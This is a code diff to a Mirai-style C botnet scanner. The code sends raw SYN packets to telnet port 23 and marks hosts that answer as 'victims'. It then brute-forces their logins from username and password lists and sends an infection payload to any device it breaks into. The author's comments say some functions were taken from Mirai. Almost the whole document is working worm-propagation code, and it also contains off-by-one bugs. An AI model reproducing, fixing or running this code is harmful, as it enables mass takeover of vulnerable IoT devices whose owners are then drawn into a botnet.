@@ -1,12 +1,12 @@
 #include "../include/main.h"
-
 /*
 	Okay so the original idea was to have a listening proc a sending proc and
 	a recv proc. Then when it recv a client it would spawn a proc to deal with
 	that client.
 
 	Then I realized how weak the devices I'm aiming for are and just used a
-	structure similar to mirai.
+	structure similar to mirai. Edit: so after writing most of this scanner I read mirais
+	and it looks like we had the same idea... I've also decided to steal some of it's functions because it's easier
 
 	Full disclosure: I'm not a coding and network god so mirais scanner is
 	probably better (100% sure it is). I'm just doing this for fun :)
@@ -177,9 +177,6 @@ bool scan_scanner(void)
 {
 	int32_t max = getdtablesize();
 	printd("Maximum files open: %d", max)
-#ifdef DEBUG
-	uint64_t sent = 0;
-#endif
 	if (scan_able == false || scan_scanning == true)
 		_exit(0);
 
@@ -187,13 +184,17 @@ bool scan_scanner(void)
 	printd("Initializing Scanner")
 
 	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
-	for (uint8_t i = 0; i < SCAN_SCANNER_MAXCON; i++)
+	for (uint8_t i = 0; i <= SCAN_SCANNER_MAXCON; i++)
 	{
 		victim_table[i].sock = -1;
+		victim_table[i].state = END;
+		victim_table[i].user = 0;
+		victim_table[i].pass = 0;
+		victim_table[i].tries = 0;
 	}
 
+	uint8_t _numconns, _finished;
 	int32_t sock, i = 1, n;
-	uint16_t fails = 0;
 	char datagram[200];
 	zero(datagram, 200);
 
@@ -225,7 +226,6 @@ bool scan_scanner(void)
 	iph->version = 4;
 	iph->tos = 0; // TOS = Type of service Can change QoS
 	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
-	iph->frag_off = htons(16384);
 	iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
 	iph->protocol = 6; // 6 = TCP
 
@@ -233,14 +233,14 @@ bool scan_scanner(void)
 	tcph->source = htons(LOCAL_PORT);
 	tcph->dest = htons(23); // Port 23 dest
 	tcph->ack_seq = 0;
-	tcph->doff = sizeof(struct tcphdr) / 4; // Size of tcp header
+	tcph->doff = 5; // Size of tcp header
 	tcph->fin = 0;
 	tcph->syn = 1; // Syncronize packet to check if the port is open
 	tcph->rst = 0; // No other should be checked
 	tcph->psh = 0;
 	tcph->ack = 0;
 	tcph->urg = 0;
-	tcph->window = htons(14600); // Maximum allowed window size
+	tcph->window = rand() & 0xffff; // Maximum allowed window size
 	tcph->urg_ptr = 0;
 
 	// Create a raw socket
@@ -279,43 +279,46 @@ bool scan_scanner(void)
 			addr.sin_addr.s_addr = iph->daddr;
 
 			// Send the packet
-			if (sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)) == -1)
-			{
-				if (++fails >= SCAN_SCANNER_ERRMAX)
-				{
-					printd("Fails/sent: %d/%d", fails, sent);
-					fails = 0;
-					sent = 0;
-				}
-			}
-#ifdef DEBUG
-			sent++;
-#endif
+			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr));
 		}
 		i = 0;
 		while (1)
 		{
-			unsigned char buf[1514];
+			char buf[1514];
 			struct iphdr *riph = (struct iphdr *)buf;
-            struct tcphdr *rtcph = (struct tcphdr *)(iph + 1);
+			/*
+			Alright so this is the offending line that gave me hours of debugging
+			It used to be struct tcphdr *rtcph = (struct tcphdr *)(iph + 1);
+			Notice how it says iph + 1
+			iph
+			not riph
+			iph
+			So essentially I was reading the tcp buffer off of the last sent packet
+			Jesus
+			*/
+			struct tcphdr *rtcph = (struct tcphdr *)(riph + 1);
 			errno = 0;
 
 			n = recvfrom(sock, buf, sizeof(buf), MSG_NOSIGNAL, NULL, NULL);
-			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK*/|| errno != 0)
+			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK || errno != 0*/)
 				break;
 
-			// printf("%s->%s %d %d %d %d %d errno %d\n", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), riph->protocol, rtcph->syn, rtcph->ack, htons(rtcph->source), htons(rtcph->dest), errno);
+			// printd("%s->%s/%s\t Proto: %d Flags: SYN %d ACK %d RST %d", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), ipv4_unpack(LOCAL_ADDR), riph->protocol, rtcph->syn, rtcph->ack, rtcph->rst);
+			if (n < (int32_t)(sizeof(struct iphdr) + sizeof(struct tcphdr)))
+				continue;
 			if (riph->protocol != 6) // Packet needs to be TCP
-				break;
+				continue;
 			if (rtcph->syn != 1)
-				break;
+				continue;
 			if (rtcph->ack != 1)
-				break;
+				continue;
 			if (rtcph->source != htons(23))
-				break;
+				continue;
+			// This line was also iph->daddr instead of riph->daddr which was even more debugging
+			if (riph->daddr != LOCAL_ADDR)
+				continue;
 
-			printd("Got a live one: %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack, rtcph->fin);
-			
+			printd("Attempting to brute: %s", ipv4_unpack(riph->saddr));
 			struct scan_victim *victim;
 			victim = &victim_table[i];
 			victim->ip = riph->saddr;
@@ -324,9 +327,14 @@ bool scan_scanner(void)
 			victim->tries = 0;
 			victim->state = CONNECTING;
 			if (i++ >= SCAN_SCANNER_MAXCON)
+			{
+				i--;
 				break;
+			}
 		}
 		// printd("Moving to bruteforce");
+		_numconns = i;
+		_finished = 0;
 		while (1)
 		{
 			if (i == 0) // if i was no incremented (no devices were found) we will move on
@@ -359,10 +367,12 @@ bool scan_scanner(void)
 						if(connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
 						{
 							victim_table[i].state = FINISHED;
+							printd("%d->%s Failed to connect", i, ipv4_unpack(victim_table[i].ip));
 						}
 						else
 						{
 							victim_table[i].state = USERNAME;
+							printd("%d->%s Connected", i, ipv4_unpack(victim_table[i].ip));
 						}
 						break;
 					} 
@@ -373,15 +383,21 @@ bool scan_scanner(void)
 						switch (x)
 						{
 							case 0:
+								printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
 								victim_table[i].state = FINISHED;
-								break;
+								goto _USERNAME_END;
 							case 1:
+								printd("%d->%s Found userprompt", i, ipv4_unpack(victim_table[i].ip));
 								break;
 							case 2:
+								printd("%d->%s Got payload prompt", i, ipv4_unpack(victim_table[i].ip));
 								victim_table[i].state = PAYLOAD;
+								goto _USERNAME_END;
 						}
+						printd("%d->%s Trying username %s", i, ipv4_unpack(victim_table[i].ip), usernames[victim_table[i].user]);
 						if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
 						{
+							printd("%d->%s Failed to send username", i, ipv4_unpack(victim_table[i].ip));
 							victim_table[i].state = FINISHED;
 							break;
 						}
@@ -389,23 +405,28 @@ bool scan_scanner(void)
 						switch (x)
 						{
 							case 0:
+								printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
 								victim_table[i].state = FINISHED;
 								break;
 							case 1:
+								printd("%d->%s Username failed", i, ipv4_unpack(victim_table[i].ip));
 								if (victim_table[i].user++ >= usersize)
 									victim_table[i].state = FINISHED;
 								break;
 							case 2:
+								printd("%d->%s Username success", i, ipv4_unpack(victim_table[i].ip));
 								victim_table[i].state = PASSWORD;
 								break;
 						}
+_USERNAME_END:
 						break;
 					}
 					case PASSWORD:
 					{
-
+						printd("%d->%s Trying password %s", i, ipv4_unpack(victim_table[i].ip), passwords[victim_table[i].user]);
 						if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
 						{
+							printd("%d->%s Failed to send password", i, ipv4_unpack(victim_table[i].ip));
 							victim_table[i].state = FINISHED;
 							break;
 						}
@@ -414,9 +435,11 @@ bool scan_scanner(void)
 						switch (x)
 						{
 							case 0:
+								printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
 								victim_table[i].state = FINISHED;
 								break;
 							case 1:
+								printd("%d->%s Password failed", i, ipv4_unpack(victim_table[i].ip));
 								if (victim_table[i].pass++ >= passsize)
 								{
 									victim_table[i].pass = 0;
@@ -426,6 +449,7 @@ bool scan_scanner(void)
 										victim_table[i].state = USERNAME;
 								}
 							case 2:
+								printd("%d->%s Password success", i, ipv4_unpack(victim_table[i].ip));
 								victim_table[i].state = PAYLOAD;
 						}
 						break;
@@ -433,6 +457,7 @@ bool scan_scanner(void)
 					case PAYLOAD:
 					{
 						// I know this look stupid for now but I'll clean it up later
+						printd("%d->%s Sending payload", i, ipv4_unpack(victim_table[i].ip));
 						if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0) == -1)
 							victim_table[i].state = FINISHED;
 						victim_table[i].state = FINISHED;
@@ -440,11 +465,23 @@ bool scan_scanner(void)
 					}
 					case FINISHED:
 					{
+						printd("%d->%s Finished", i, ipv4_unpack(victim_table[i].ip));
+						_finished++;
+						victim_table[i].state = END;
+						break;
+					}
+					case END:
+					{
+						if (_finished >= _numconns)
+						{
+							goto _breakloop;
+						}
 						break;
 					}
 				}
 			}
 		}
+_breakloop:;
 	}
 end:
 	scan_scanning = false;
